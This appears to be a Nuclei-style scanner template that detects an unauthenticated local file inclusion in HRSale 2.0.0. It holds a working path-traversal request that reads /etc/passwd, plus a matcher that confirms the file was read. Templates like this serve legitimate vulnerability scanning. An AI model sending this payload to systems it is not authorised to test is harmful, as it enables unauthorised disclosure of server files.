id: hrsale-unauthenticated-lfi
info:
  author: 0x_Akoko
  description: This exploit allow you to download any readable file from server without
    permission and login session
  name: Hrsale 2.0.0 - Hrsale Unauthenticated Lfi
  reference: https://www.exploit-db.com/exploits/48920
  severity: high
  tags: hrsale,lfi
requests:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/download?type=files&filename=../../../../../../../../etc/passwd'
